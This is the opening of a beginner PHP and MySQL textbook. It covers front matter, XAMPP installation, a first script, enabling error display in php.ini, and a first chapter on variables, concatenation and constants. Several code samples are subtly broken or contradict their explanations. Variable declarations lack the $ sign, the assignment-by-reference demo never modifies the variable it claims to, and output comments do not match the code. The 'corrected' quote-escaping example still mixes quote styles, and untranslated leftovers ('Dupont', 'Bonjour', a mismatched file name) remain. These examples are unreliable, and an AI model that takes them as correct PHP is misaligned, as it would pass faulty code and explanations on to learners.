PHP & MYSQL :

Course and corrected exercises

 

 

 

Master dynamic web development

 

 

 

 

 

Maximilien Lambert

 

 

Copyright © 2025

 

No reproduction, storage in a retrieval system or transmission in any form whatsoever may be made without the prior written permission of the publisher, except for brief quotations incorporated in critical articles or reviews.

 

Every effort has been made to ensure the accuracy of the information presented in this book. However, the examples contained in this book are provided functional at the time of writing in the context of specific browser versions and current PHP and MySQL versions. Neither the author, nor the publisher, nor their distributors and resellers can be held responsible for any direct or indirect damage resulting from this book.

 

 

Author : Maximilien Lambert

Publisher: Maximilien Lambert

Production Designer: Élise Dubois

 

 

First publication: 2025

 

[www.skilldeve.com](http://www.skilldeve.com)

 

# About the author

 

 

Maximilien Lambert is an experienced web developer and trainer in the field of digital technologies. With his recognized expertise, he has led numerous international training courses and seminars at world-renowned institutions. His exceptional pedagogical approach has earned him a reputation for excellence among his students, thanks to his ability to simplify complex concepts and make them accessible to all.

 

A university lecturer for over 20 years, Maximilien Lambert shares his passion for learning and passing on IT knowledge. His long experience in the educational field enables him to inspire several generations of learners around the world, passing on not only technical skills, but also a global vision of the web development sector.

 

Passionate about sharing knowledge, Maximilien Lambert excels at imparting computer skills, inspiring generations of learners around the world. In addition to his teaching activities, he offers specialized training to professionals, helping them hone their skills and stay at the cutting edge of their respective fields.

 

His dedication to excellence, his passion for teaching and his technical expertise make Maximilien Lambert an essential reference in the field of web development and digital training.  

Table of contents

 

 

 

 

[About the author](#index_split_002.html#id_Toc163477088)

[Foreword](#index_split_004.html#id_Toc163477089)

[Introduction and development environment](#index_split_006.html#id_Toc163477090)

[SECTION A:](#index_split_008.html#id_Toc163477091)

[MASTER THE FUNDAMENTALS OF PHP PROGRAMMING](#index_split_008.html#id_Toc163477092)

[Chapter 1](#index_split_009.html#id_Toc163477093)

[Variables, constants and operators](#index_split_009.html#id_Toc163477094)

[Chapter 2](#index_split_012.html#id_Toc163477095)

[Conditional structures](#index_split_012.html#id_Toc163477096)

[Chapter 3](#index_split_015.html#id_Toc163477097)

[Loops in PHP](#index_split_015.html#id_Toc163477098)

[Chapter 4](#index_split_019.html#id_Toc163477099)

[Functions and Generators in PHP](#index_split_019.html#id_Toc163477100)

[Chapter 5](#index_split_022.html#id_Toc163477101)

[Tables in PHP](#index_split_022.html#id_Toc163477102)

[Chapter 6](#index_split_024.html#id_Toc163477103)

[PHP built-in functions](#index_split_024.html#id_Toc163477104)

[SECTION B](#index_split_026.html#id_Toc163477105)

[ADVANCED DATA MANAGEMENT AND BROWSER INTERACTION](#index_split_026.html#id_Toc163477106)

[Chapter 7](#index_split_027.html#id_Toc163477107)

[Browser data processing (GET, POST)](#index_split_027.html#id_Toc163477108)

[Chapter 8](#index_split_029.html#id_Toc163477109)

[Images and files](#index_split_029.html#id_Toc163477110)

[Chapter 9](#index_split_031.html#id_Toc163477111)

[Session and cookie management](#index_split_031.html#id_Toc163477112)

[SECTION C](#index_split_033.html#id_Toc163477113)

[MYSQL DATABASE MANAGEMENT](#index_split_033.html#id_Toc163477114)

[Chapter 10](#index_split_034.html#id_Toc163477115)

[Introduction to Databases and Connecting to a MySQL Database](#index_split_034.html#id_Toc163477116)

[Chapter 11](#index_split_036.html#id_Toc163477117)

[Inserting, retrieving and displaying data from a database](#index_split_036.html#id_Toc163477118)

[Chapter 12](#index_split_038.html#id_Toc163477119)

[Updating and deleting data in a database](#index_split_038.html#id_Toc163477120)

[SECTION D](#index_split_040.html#id_Toc163477121)

[WEB APPLICATION SECURITY](#index_split_040.html#id_Toc163477122)

[Chapter 13](#index_split_041.html#id_Toc163477123)

[PHP security : Attack prevention and risk management](#index_split_041.html#id_Toc163477124)

[SECTION E](#index_split_043.html#id_Toc163477125)

[OBJECT-ORIENTED PROGRAMMING IN PHP](#index_split_043.html#id_Toc163477126)

[Chapter 14](#index_split_044.html#id_Toc163477127)

[Classes and objects](#index_split_044.html#id_Toc163477128)

[Chapter 15](#index_split_047.html#id_Toc163477129)

[Data Encapsulation and Modeling](#index_split_047.html#id_Toc163477130)

[Chapter 16](#index_split_050.html#id_Toc163477131)

[Inheritance in PHP](#index_split_050.html#id_Toc163477132)

[Chapter 17](#index_split_053.html#id_Toc163477133)

[Interfaces and abstract classes](#index_split_053.html#id_Toc163477134)

[Chapter 18](#index_split_055.html#id_Toc163477135)

[Exception handling](#index_split_055.html#id_Toc163477136)

[Chapter 19](#index_split_057.html#id_Toc163477137)

[Namespaces](#index_split_057.html#id_Toc163477138)

[Chapter 20](#index_split_059.html#id_Toc163477139)

[Traits](#index_split_059.html#id_Toc163477140)

[Chapter 21](#index_split_061.html#id_Toc163477141)

[Magic methods](#index_split_061.html#id_Toc163477142)

[Exercises correction](#index_split_063.html#id_Toc163477143)

[Encouragement and Congratulations](#index_split_076.html#id_Toc163477144)

[About the author](#index_split_077.html#id_Toc163477145)

 

 

 

 

# Foreword

 

 

 

In an ever-changing digital world, mastering web programming languages like PHP and manipulating databases like MySQL are crucial skills for any budding web developer. Our book "PHP & MySQL: Master dynamic web development" has been meticulously designed to guide you through every stage of your learning process, from beginner to advanced levels.

 

SECTION A : Mastering the fundamentals of PHP programming

 

In this first section, we delve into the heart of PHP programming, exploring variables, constants, operators, conditional structures, loops, functions and arrays. You'll discover how to manipulate data, control program flow and organize your code efficiently.

 

SECTION B: Advanced data management and browser interaction

 

Section B takes you further into dynamic web development by teaching you how to interact with browsers. You'll learn how to manage data from forms, manipulate images and files, and set up sessions and cookies to create interactive user experiences.

 

SECTION C: MySQL database management

 

Database management is an essential aspect of web development. In this section, you'll learn how to design and manipulate MySQL databases, from connecting to a database to inserting, retrieving, updating and deleting data.

 

SECTION D : Web Application Security

 

Web application security is of paramount importance. This chapter will provide you with the knowledge you need to secure your PHP applications against common attacks such as SQL injection, Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF).

 

SECTION E: Object-oriented programming in PHP

 

Object-oriented programming (OOP) is a powerful paradigm that allows you to structure your code in a modular and reusable way. In this section, you'll discover the fundamental concepts of OOP, including classes, objects, encapsulation, inheritance, interfaces, abstract classes, exceptions, namespaces and traits.

 

Each chapter is illustrated with numerous examples, accompanied by simple, detailed explanations.

Some chapters are accompanied by practical exercises to put your knowledge into practice, and to help you check your understanding, a suggested correction for each exercise is provided at the end of the book.

 

We're confident that this book will provide you with the tools you need to become a competent and accomplished PHP developer. Whether you're a beginner looking to learn new skills, or an experienced professional looking to deepen your knowledge, "PHP & MySQL: Master dynamic web development" is your ideal companion on your learning journey.

 

Happy reading and learning!

 

The editorial team

 

 

You can count on our support!

 

If you have any questions about any aspect of this book, or if you need any help, please send us an e-mail at contact@skilldeve.com and mention the title of the book in the subject line.

 

Share your opinion

 

We look forward to hearing from you! After exploring the pages of "Mastering HTML and CSS: from beginner to expert", we encourage you to share your opinion. To do so, simply click on the following link to access Amazon's review page dedicated to this book. Your feedback is valuable, not only to us, but to the entire technology community. Your feedback will help us keep the quality of our content at an optimum level. We look forward to reading your thoughts and hearing how this book has enriched your knowledge of HTML and CSS.

 

![Image](images/image.png)

 

#  

# **Introduction and development environment**

 

 

 

 

 

 

 

In this introductory chapter, we will delve into the fascinating world of web development with PHP and MySQL. We will start with an exploration of how websites work, examining the differences between static and dynamic sites, as well as the programming languages associated with each type. Then, we will focus on the development environment for coding in PHP, including setting up a local Apache server and MySQL for creating and testing web applications on our own machine.

 

## How does a website work?

When it comes to how a website works, it's common to distinguish between two main types: static and dynamic.

Before going into detail, it's important to clarify the two essential components: the client, which corresponds to the user's computer, and the server, which hosts the website.

 

The fundamental question is: How do these two players communicate with each other?

To answer this question, we need to examine the communication process specific to each type of website.

 

In the case of a static website, communication takes place in two simple steps:

 

*   The client sends a request to the server to display a web page;
*   The server responds by sending the requested web page back to the client.

In concrete terms, in this scenario, the server stores web pages as static files and sends them to clients without any further modification or processing.

 

![Image](images/image-1.png)

 

For a dynamic site, on the other hand, the process is slightly more complex, with an intermediate step:

 

*   The client sends a request to the server to display a web page;
*   Instead of simply returning an existing page, the server dynamically generates the page according to the client's specific request;
*   The server then sends the freshly generated page to the client.

 

In this case, the server performs real-time processing and calculations to create a personalized page for each client request.

 

In conclusion, the fundamental difference between static and dynamic sites lies in the way web pages are generated and delivered to users, with significant implications in terms of data processing and content personalization.

 

![Image](images/image-2.png)

 

## Programming languages for every type of website

Websites fall into two broad categories: static and dynamic. Each type of site uses specific programming languages for its development.

 

Static websites :

Static websites are mainly built using markup languages such as HTML (HyperText Markup Language) and CSS (Cascading Style Sheets). HTML is used to structure the content of a Web page, defining elements such as headings, paragraphs, images, etc. CSS is used to style and format these elements, controlling their visual appearance.

 

Dynamic Websites :

Dynamic websites require interaction with a database, and use server-side programming languages to generate personalized content based on user requests. Common programming languages used for dynamic web development include PHP (Hypertext Preprocessor), Python, ASP .NET, Java, JavaScript and Ruby, and many others. PHP is one of the most popular languages for server-side web development, due to its simplicity, flexibility and compatibility with many database management systems, notably MySQL. Python and Ruby are also widely used for their dynamic web development capabilities and expressive syntax.

 

Understanding the programming languages suitable for each type of website is essential for choosing the most appropriate technology for a specific project, and for developing robust, functional websites.

## Development environment

There are two main approaches to website development:

 

Local development :

This method involves working on one's own computer, using a specific development environment to create and test the website. Once development is complete, the site is then transferred to a remote hosting server to make it accessible over the Internet. This approach is often preferred, as it offers an isolated working environment and does not require a permanent Internet connection. In this book, we explore in detail how to set up this development environment.

 

Remote development :

With this approach, website development takes place directly on the remote server hosting the site under development. This method is suitable for experienced developers working on complex projects requiring real-time collaboration with other team members. It also enables the site to be tested on different browsers and operating systems before going into production.

 

In short, the choice between local and remote development depends on the specific needs of the project, the experience of the developer and the resources available. All the examples presented in this book are tested locally before being deployed on a remote server.      

 

To develop a dynamic website, several elements are required on our machine:

 

**Apache server: This is** the Web server responsible for managing the site. However, by default, Apache can only handle static websites, i.e. HTML pages. To enable it to handle PHP as well, a plugin must be added. By combining Apache with PHP, our computer will be able to read web pages written in PHP.

 

**Database management system (DBMS)**: Since dynamic websites require interaction with databases, a database management tool is essential. MySQL is one of the most commonly used DBMS for this purpose.

 

![Image](images/image-3.png)

 

Fortunately, there are software programs that make it much easier to install these items on your computer. Depending on the operating system you're using, you can choose from the following options:

 

*   For Windows: WAMP Server [(](http://www.wampserver.com/)http://www.wampserver.com/)

 

*   For Mac: MAMP [(](https://www.mamp.info/en/downloads/)https://www.mamp.info/en/downloads/)

 

*   For Linux: XAMPP [(](https://www.apachefriends.org/fr/download.html)https://www.apachefriends.org/fr/download.html)

 

XAMPP is available in three different versions: one for Windows, one for Mac and one for Linux. Although it is more complete than the other options (WAMP and LAMP), it is not necessary to use all its features. In this book, we'll be installing XAMPP for its versatility. However, you are free to choose between XAMPP, MAMP or WAMP, as the basic operation is the same for all three.

## Downloading and installing XAMPP on Mac OS

Here are the steps to download and install XAMPP on macOS :

 

Visit the official Apache Friends website: https://www.apachefriends.org/fr/download.html

 

On the download page, you'll see different versions of XAMPP available. Choose the one best suited to macOS by clicking on the corresponding download button.

 

![Image](images/image-4.png)

 

Once the download is complete, open the downloaded file (it should be in your Mac's "Downloads" folder).

 

Double-click on the installation file to begin the XAMPP installation process.

 

Follow the on-screen instructions to install XAMPP on your Mac. You may need to enter your administrator password to authorize installation.

 

![Image](images/image-5.png)

 

When you click on the XAMPP icon, an alert window may appear, telling you that "macOS cannot check this app for malware". In this case, depending on the version of your Mac system, you may need to modify your Mac's security settings in order to be able to install XAMPP :

 

*   Open System Settings.

 

*   Click on Privacy & Security, scroll down and click on the "Open anyway" button to confirm your intention to open or install the app.

 

![Image](images/image-6.png)

 

When installation is complete, you'll see a confirmation window. Click on "Finish" to close the installer.

 

XAMPP is now installed on your Mac. To start the services (Apache, MySQL, etc.), open XAMPP from your "Applications" folder and run the "manager-osx" file, then click on the corresponding buttons to activate the necessary services.

 

![Image](images/image-7.png)

 

Once the services are started, you can access the XAMPP management interface via your web browser by entering "localhost" in the address bar.

 

These steps should allow you to successfully download and install XAMPP on your Mac.

## Downloading and installing XAMPP on Windows

 

Here are the steps to download and install XAMPP on Windows:

 

Visit the official Apache Friends website: https://www.apachefriends.org/fr/download.html

 

On the download page, you'll see different versions of XAMPP available. Choose the one best suited to Windows by clicking on the corresponding download button.

 

Once the download is complete, open the downloaded file by double-clicking on it. It should be in the folder where you normally download files.

 

The XAMPP installer will open. Click "Yes" if Windows asks you to authorize changes on your computer.

 

The installer will guide you through the installation process. Choose the components you wish to install (by default, they are all selected) and select the folder where you wish to install XAMPP.

 

Click on the "Install" button to begin installation. Wait for the process to complete.

 

Once installation is complete, you will be prompted to start XAMPP components (Apache, MySQL, etc.). Click on "Finish" to close the installer.

 

XAMPP is now installed on your computer. To start the services, open XAMPP from the Start menu and click on the corresponding buttons to start Apache and MySQL.

 

Once the services have been started, you can access the XAMPP management interface via your web browser by entering "localhost" in the address bar.

 

These steps should enable you to download and install XAMPP successfully on your Windows computer.

## Download and install a text editor

After installing XAMPP, we recommend you download and install a text editor for writing and editing your code files. Here are a few examples of the most popular text editors suitable for web development:

 

**Sublime Text**: Sublime Text is a lightweight, highly customizable text editor with many useful features for web development, such as syntax highlighting, auto-completion and project management. 

Download link: https://www.sublimetext.com/

 

**Visual Studio Code**: Visual Studio Code (VS Code) is a source code editor developed by Microsoft. It is extensible, offers Git integration, debugging features and numerous extensions for web development.

Download link: https://code.visualstudio.com/

 

**Brackets**: Brackets is an open-source text editor developed by Adobe. It is specially designed for web development and includes features such as live preview, syntax highlighting, auto-completion and extension support.

Download link: https://brackets.io/

 

You can choose the text editor that best suits your web development needs and preferences. Once you've installed your preferred text editor, you can start creating and editing code files for your web project.

 

## Creating a project in XAMPP

In XAMPP, you don't create projects directly, but rather create directories for your projects in the htdocs directory. Here's how to do it:

 

**Find the htdocs directory:** The htdocs directory is where you store your website files. By default, this directory is located in the XAMPP installation folder. On Windows, it's usually located in C:\\xampp\\htdocs, and on Mac, it's in /Applications/XAMPP/htdocs.

 

**Create a new directory for your project**: In the htdocs directory, create a new directory for your project. You can give it any name you like, e.g. "ebookphp".

 

Once you've created the directory for your project, you can place all your website files and folders in it. This can include HTML, CSS, PHP, JavaScript files, images, etc.

 

**Accessing your project via the browser: Once** you've placed your project files in the directory you've created, you can access your website by opening a web browser and entering the following URL in the address bar: http://localhost/ebookphp. Be sure to replace "ebookphp" with the name of the directory you've created for your project.

 

By following these steps, you can create and access your project in XAMPP. Make sure you start the Apache and MySQL services in XAMPP so that your website functions correctly.

## Your first PHP script

Here are the steps to create your first PHP script using XAMPP and the "ebookphp" directory created in the "htdocs" folder:

 

Launch XAMPP as explained above and start Apache by clicking on the corresponding "Start" button. Make sure they are displayed in green, indicating that it is running.

 

Open the text editor of your choice to write your PHP script.

 

In your text editor, create a new file and save it in the "ebookphp" directory located in the "htdocs" folder of your XAMPP installation. Name this file "first\_script.php".

 

Write your First PHP Script: In your "first\_script.php" file, write the following PHP code:

 

 

 <?php  
  
 echo "Hello, world!";

  
 ?>

 

 

Once you've written your PHP script, save the file.

 

Launch your favorite web browser (e.g. Google Chrome, Mozilla Firefox, etc.).

 

In your browser's address bar, enter the following URL: http://localhost/ebookphp/premier\_script.php and press "Enter".

 

You should see the phrase "Hello, world!" displayed in your browser, indicating that your first PHP script has been successfully executed.

 

![Image](images/image-8.png)

 

 

Congratulations! You've just created and executed your first PHP script using XAMPP. This simple example marks the start of your journey into the exciting world of web development with PHP.

## Error display

As you know, making errors, especially syntax errors, is quite common, and I can assure you that there isn't a developer in the world who doesn't make them. It's therefore very useful to display indications of these errors.

 

In fact, depending on the configuration of your server, errors may not be displayed at all! Many beginners find themselves puzzled when they run a PHP page in a browser and see absolutely nothing. There's no error message, just a blank page, for example. This happens when errors are present in the code and our PHP server is not configured to display errors.

 

To solve this problem, simply make a few changes to XAMPP's php.ini file.

To find the location of this file, simply addition the code below to the previously created file first\_script.php (or any other file in your project).

 

 

 <?php  
 phpinfo();  
 ?>

 

This code is used to display detailed information on your server's PHP configuration. When you execute this code in a PHP file and open it in a browser, a web page is generated with a wealth of information on the installed PHP version, activated modules, configuration directives, file paths, environment variables and much more.

 

This phpinfo() page is often used to diagnose PHP configuration problems, check enabled features, or simply to obtain details about the PHP server in use. It provides a useful overview of the PHP environment, which can be particularly useful when developing or configuring web applications.

 

The full path of the php.ini file is in the "Loaded Configuration File" line:

 

![Image](images/image-9.png)

 

Once you've located the php.ini file, open it in a text editor.

 

Look for the **display\_errors** directive. This directive controls whether PHP errors are displayed on screen. By default, this directive is generally set to Off.

 

![Image](images/image-10.png)

 

Change the value of the display\_errors directive to On.

 

You can also set the error\_reporting directive to specify the level of errors to be displayed. For example, you can set error\_reporting = E\_ALL to display all errors, or error\_reporting = E\_ALL & ~E\_NOTICE to display all errors except notifications.

 

![Image](images/image-11.png)

 

Save your changes to php.ini.

 

Restart your Apache server for the changes to take effect.

 

Once configured, PHP errors will be displayed on screen when you run PHP scripts. This will help you diagnose and resolve errors more quickly as you develop your website.

## Conclusion

In this introductory chapter, we've taken several crucial steps towards setting up a development environment conducive to the creation of dynamic websites with PHP and MySQL.

 

We began by installing XAMPP, a local web server that brings together the tools needed to run PHP scripts and interact with MySQL databases. This step is essential as it enables us to simulate a production environment on our own computer, thus facilitating the development and testing process.

 

Then we created our first PHP script, marking the start of our journey into the fascinating world of web development. Through this simple example, we explored the basic structure of a PHP script, including PHP tags, output statements and comments.

 

Finally, we've configured PHP to display errors, which is a fundamental practice for effective debugging of our PHP scripts. By enabling error display, we're able to quickly identify and correct any syntax or logic errors in our code.

 

By combining these steps, we've established a solid foundation for our learning journey in web development with PHP and MySQL. We're now ready to further explore advanced concepts, create dynamic web applications and take on new challenges in this exciting field.

 

 

# SECTION A:

# MASTER THE FUNDAMENTALS OF PHP PROGRAMMING

 

 

In this section, we'll explore the essential basics of programming in PHP, a powerful and versatile scripting language used to develop dynamic, interactive web applications.

 

### Chapter 1: Variables, constants, expressions and operators

We start with the basics of PHP programming, including variables, constants, expressions and operators. You'll learn how to declare variables, assign values to them and manipulate these values using expressions and operators.

 

### Chapter 2: Control structures (if, else, switch, match, while, for)

In this chapter, we explore control structures in PHP, such as if, else, elsif, switch and match statements. You'll discover how to use these structures to control the flow of your code's execution according to specific conditions.

 

### Chapter 3: Loops in PHP

In this chapter, you'll discover how while, for and do...while loops can be used to browse and manipulate data.

 

### Chapter 4: Functions and Generators in PHP

Functions are fundamental elements of PHP programming. In this chapter, we look at how to define, call and use functions in PHP, as well as the scope of variables inside and outside functions. We take a detailed look at generators in PHP and how to use them to generate sequences of values.

 

### Chapter 5: Tables in PHP

Arrays are essential data structures in PHP. In this chapter, we discover how to create, manipulate and browse arrays in PHP, as well as their practical applications in web application development.

 

### Chapter 6: PHP built-in functions

PHP offers a wide range of built-in functions that facilitate the development of web applications. In this chapter, we explore some of the most commonly used built-in functions in PHP and how to use them effectively in your projects.

 

 

# Chapter 1

# Variables, constants and operators

 

 

 

 

What you'll learn in this chapter:

 

**Variables**: How to declare variables in PHP, assign values to them and manage their scope in scripts.

 

**Expressions**: Training and evaluation of expressions in PHP, including the use of arithmetic, comparison and logical operators to manipulate data.

 

**Operators**: The various types of operators available in PHP, such as arithmetic operators (+, -, \*, /), comparison operators (==, !=, <, >, etc.) and logical operators (&&, ||, !).

 

**Using variables**: Best practices for naming and using variables in PHP, as well as managing their scope and handling in scripts.

 

**String concatenation**: How to combine and manipulate strings in PHP using the concatenation operator (.) to create more complex strings.

 

**Notion of data types**: An introduction to the different data types in PHP, such as integers, floating-point numbers, strings, arrays, etc.

 

**The concept of type conversion**: How to convert data from one type to another in PHP, especially between numeric and string types.

 

**Using constants** : The definition and use of constants in PHP to store values that do not change throughout script execution.

 

**Increment and decrement operators**: Use the increment (++) and decrement (--) operators to modify the value of a numerical variable.

 

**Special assignment operators**: The syntax of combined assignment operators such as +=, -=, \*=, /=, etc., to perform arithmetic operations and update the value of a variable in a single step.

 

By covering these aspects, you'll have a complete and in-depth understanding of variables, expressions and operators in PHP, which will help you write efficient and functional PHP scripts.

 

 

## Introduction to variables and constants in PHP

 

PHP programming is based on the use of variables and constants to store and manipulate data. In this chapter, we'll explore in detail these two fundamental concepts and their use in the development of dynamic web applications.

 

 
| Imagine you're a magician and you've got a magic box. This box can hold all sorts of different things. You can put rabbits, coins, doves and so on inside. At any time, you can change what you put in your hat. It's like a variable in PHP where you can store different values and change them to suit your needs. || ![Image](images/image-12.png) |
| --- | --- |
| ![Image](images/image-13.png) ||  Now imagine you have a treasure chest containing your most precious treasures. This chest is solid and indestructible, and it always contains the same precious treasures, no matter what's going on around it. It's like a constant in PHP where you define a value that will never **change.**  |

 

### Defining variables and constants in PHP

 

In PHP, a variable is a named storage space that can contain a value that can be modified throughout script execution. It is defined by a name followed by an equal sign (=) and the assigned value. For example :

 

 

 

<?php

 

 variable\_name \= "value";

?>

 

 

On the other hand, a PHP constant is a named identifier representing a value that cannot be modified during script execution. It is defined using the define() function and can be used anywhere in the script. For example :

 

 

<?php

 

 define("CONSTANT\_NAME", "constant\_value");

 

?>

 

 

### Importance of the proper use of variables and constants in PHP programming

 

The proper use of variables and constants is essential in PHP programming for several reasons:

 

**Code clarity**: By using meaningful variable and constant names, code becomes more readable and easier to understand for other developers.

 

**Ease of maintenance**: By defining variables and constants in a consistent way, it's easier to modify and maintain code in the future.

 

**Avoiding errors**: Using constants for values that must not be modified reduces the risk of errors in the code by preventing accidental modification.

 

In short, understanding the difference between variables and constants, and the importance of using them appropriately, is crucial to developing efficient and reliable PHP applications.

 

## Declaring and using variables

Variables play a crucial role in PHP programming, enabling data to be stored and manipulated throughout the execution of a script. In this section, we'll explore the syntax for declaring variables, how to assign values to them and how to use them in PHP scripts.

 

### Syntax for declaring variables in PHP

 

In PHP, variables are declared using the dollar sign (**$)** followed by the variable name. It's important to note that variable names must start with a letter or an underscore, and can then contain letters, numbers and underscores. 

In PHP, a variable is generally declared using the following syntax:

 

<?php

 

 VariableName \= VariableValue;

?>

 

 

*   **VariableName is** the name of the variable you wish to declare. It must begin with the $ symbol, followed by a name that respects certain syntax rules (start with a letter or underscore, contain no spaces or special characters other than underscore, etc.).

 

*   **\=** is the assignment operator in PHP. It is used to assign a value to the variable.

 

*   **VariableValue** is the value you wish to assign to the variable. This value can be of various data types, such as strings, integers, floating-point numbers, Booleans, arrays, etc.

 

Here are some examples of variable declaration in PHP :

 

 

<?php

 $name \= "John";  
 age \= 30;  
 $account\_balance \= 1000.50;

?>

 

In this example, we declare a variable **$name** and assign it the value "**John**", which is a string. This variable can now be used in our script to store and manipulate the name "John".

 

In this line of code $age \= 30;, we've declared a variable named $age est and assigned it the value 30. This means that the variable $age contains the integer 30.

 

In this line of code $account\_balance \= 1000.50;, a third variable named $account\_balance is declared and assigned the value 1000.50. This means that the variable $account\_balance contains the floating-point number 1000.50.

 

### Rules to follow when declaring a new variable

 

*   Every variable in PHP must begin with the $ symbol, followed by the variable name.
*   The name of a variable must begin with a letter or an underscore "**\_**", and may not begin with a number.
*   Variable names may only contain letters, numbers and underscores "**\_"**, with no special characters.
*   Variable names cannot contain spaces.
*   It's important to note that variable names are case-sensitive in PHP. This means that the use of upper or lower case creates different variables. For example, the variables $NAME, $Name and $name are considered separate variables.

These rules ensure the correct and consistent declaration of variables in PHP, contributing to better readability and management of the source code. The following table illustrates some examples of legal and illegal variable names.

 

 
| Legal variable names || Illegal variable names |
| --- | --- |
| $myvariable$\_myvariable$myvariable1MASTER2$\_32monlastname || $3myvariable$\*variable$myvariable+ |

 

###  

### Assignment by value and assignment by reference

 

In PHP programming, when assigning values to variables, it's important to understand the concepts of assignment by value and assignment by reference. These two assignment methods determine how data is manipulated and shared between variables in a PHP script.

 

**Assignment by value** :

 

When a variable is assigned by value, a copy of the source variable's value is created and assigned to the target variable. This means that the two variables have separate values stored in different memory locations. Any changes made to the target variable do not affect the source variable, and vice versa. This allows independent manipulation of data between variables.

 

 

 

 

Example:

 

 
| <?php  
 $var1 \= "Hello";  
 $var2 \= $var1; // Assignment by value  
  
 echo $var2; // Display "Hello"  
 echo "<br\>";  
  
 $var1 = "Hello everybody!";  
 echo $var1; // Display "Hello"  
 echo "<br\>";  
 echo $var2; // Display "Hello"  
 echo "<br\>";  
?>  ||  In this example, **$var2** is assigned by value to **$var1, which** means that **$var2** contains a **copy of** the value of **$var1**. Consequently, when the value of $var1 is modified, this does not affect the value of $var2.  |
| --- | --- |

Result:

 

![Image](images/image-14.png)

 

 

**Assignment by reference** :

 

Conversely, when a variable is assigned by reference using the "**&"** symbol, both variables share the same reference to the memory location containing the value. This means that any modification made to one of the variables also affects the other, as they point to the same value in memory. This allows data to be shared and manipulated directly between the variables, which can be useful in certain use cases.

 

 

 

Example:

 

 
| <?php  
  
 $var1 \= "Hello";  
 $var2 \= &$var1; // Assignment by reference  
  
 echo $var2; // Display "Hello"  
 echo "<br\>";  
  
 $var1 \= "Hello";  
 echo $var2; // Display "Hello"  
  
?>  || In this example, $var2 is assigned by reference to $var1, which means that both variables point to the same value in memory. So, when the value of $var1 is modified, the value of $var2 is also modified, as they share the same reference. |
| --- | --- |

 

Result :

 

![Image](images/image-15.png)

###  

### Using variables in PHP scripts

 

Variables can be used in PHP scripts simply by referencing their name. They can be used to display data, perform calculations, or any other operation requiring the manipulation of data. Here are a few examples of how variables can be used in PHP scripts:

 

Example 1:

 

<?php $name \= "Bob";  
 echo $name;  
?>

 

**$name = "Bob";** : This line declares a variable $name and assigns it the value "Bob". The variable $name now contains the string "Bob".

 

**echo $name;** : This line displays the contents of variable $name. 

The **echo** function is used to display text or variables in PHP. In this case, it displays the value of the variable $name, which is "Bob".

 

Result

 

![Image](images/image-16.png)

 

Exemple 2 :

 

<?php  
 $firstname \= "Alice";  
 $age \= 25;  
 echo "Hello, my name is $firstname and I am $age years old.";  
?>

 

In this example, the variables $firstname and $age are used to store information about a person, then displayed in a sentence.

 

Result

 

![Image](images/image-17.png)

 

Example 3:

 

<?php

 $number1 \= 10; $number2 \= 5; $sum \= $number1 \+ $number2;  
 echo "The sum of $number1 and $number2 is equal to $sum.";  
?>

 

In this example, variables $number1 and $number2 are used to store numbers, then used in a calculation to obtain the sum, which is stored in variable $sum, and finally displayed.

 

## Result:

## ![Image](images/image-18.png)

##  

## Display and concatenation in PHP

In PHP, text and variables can be displayed in a number of ways, such as using the **echo function** or enclosing strings in double (" ") or single ( ' ') quotation marks. 

Concatenation in PHP consists in joining several strings to form a single string. This can be useful when you want to combine variables, constants and text strings to form a complete message or a more complex expression.

 

Example of the use of double and single quotation marks :

 

<?php  
 $firstname \= "Alice";  
 echo "Hello, $firstname!"; // Displays "Hello, Alice!"  
 echo "<br\>";  
 echo 'Hello, $firstname!'; // Display "Hello, $firstname!"  
?>

 

Result:

 

![Image](images/image-19.png)

 

In this example, the first **echo** statement uses double quotes to display the value of the variable $firstname, while the second **echo** statement uses single quotes, displaying the literal text "$firstname" without interpreting the variable.

###  

### Use of the concatenation operator, the dot (.) :

 

In PHP, the concatenation operator is represented by the dot (**.**) and is used to concatenate strings.

 

Example 1:

 

<?php  
 $firstname \= "Alice";  
 $name \= "Smith";  
 $message \= "Hello, " . $firstname . " " . $name . " !";  
 echo $message;  
?>

 

In this example, the variables $firstname and $lastname contain the values "Alice" and "Dupont" respectively. The concatenation operator (**.**) is used to combine these variables with text strings to form the complete message "Hello, Alice Smith!".

Double quotation marks ( " " ), separated by a space and inserted between the two variables $firstname and $lastname, create a space between the values of these two variables (between Alice and Dupont).

 

Result:

 

![Image](images/image-20.png)

 

Example 2

 

<?php  
 

 $age = 30;  
 $message = "She's turning " .$age. " next week, but she doesn't look a day over 25 ";

  
 echo $message;  
  
?>

 

In this example, the variable $age contains the numerical value 30. The concatenation operator (**.**) is used to combine this variable with text strings to form the complete message "I'm 30 years old".

 

Result:

 

![Image](images/image-21.png)

 

 

### Apostrophe in a string with a contraction

###  

Let's modify the previous example by using apostrophes instead of double quotes:

 

<?php

  
 $age = 30;  
 $message = 'She's turning " .$age. " next week, but she doesn't look a day over 25 ';

  
 echo $message;  
?>

 

When you run this code, you'll get an error because of the line where the variable $message is defined.

 

![Image](images/image-22.png)

 

The error occurs because the apostrophe is used in the string “**She’s”** and **“doesn’t”**. In PHP, when a string is enclosed in single quotes ( **' '** ), apostrophes within the string must be escaped with a backslash **( \\**) to avoid confusion with the end of the string.

 

To resolve this error, you can escape the apostrophe with a backslash (\\) :

 

<?php  
 $age = 30;  
 $message = 'She\\'s turning " .$age. " next week, but she doesn\\'t look a day over 25 ';  
 echo $message;  
?>

###  

### Using the .= operator :

 

In PHP, the **.=** operator can be used to concatenate a string to an existing variable.

 

<?php   
 $message = "Hello ";  
 $message .= "everyone!";  
 echo $message;  
?>

 

In this example, the string "Everybody!" is concatenated with the variable $message, which already contains the string "Hello", to form the complete message "Hello everybody!".

In other words, the code line $message **.=** "everyone!"; uses the concatenation operator (**.=**) to addition the string "everyone!" to the end of the variable $message. This means that the string 'everybody!' is appended to the end of the existing string in the $message variable.

Note that the string "Bonjour" contains a space at the end, allowing the insertion of the space between the two text strings "Bonjour" and "Bonjour tout le monde!

 

![Image](images/image-23.png)

 

Concatenation in PHP is an efficient way of combining strings and variables to create dynamic messages and complex expressions in your PHP scripts.

By using these different display and concatenation methods, you can efficiently manipulate text and variables in your PHP scripts.

## Using Constants in PHP

PHP constants are identifiers (names) that represent immutable values throughout script execution. Once defined, constants cannot be modified or reassigned during script execution.

 

### Defining constants in PHP

 

In PHP, there are two ways to define constants: using the function define() or the const directive. The syntax for defining a constant is as follows:

 

![Image](images/image-24.png)

 

Example:

 

<?php  
 define('VAT', 0.20);  
 const AVERAGE\_GRADE = 10;  
?>

 

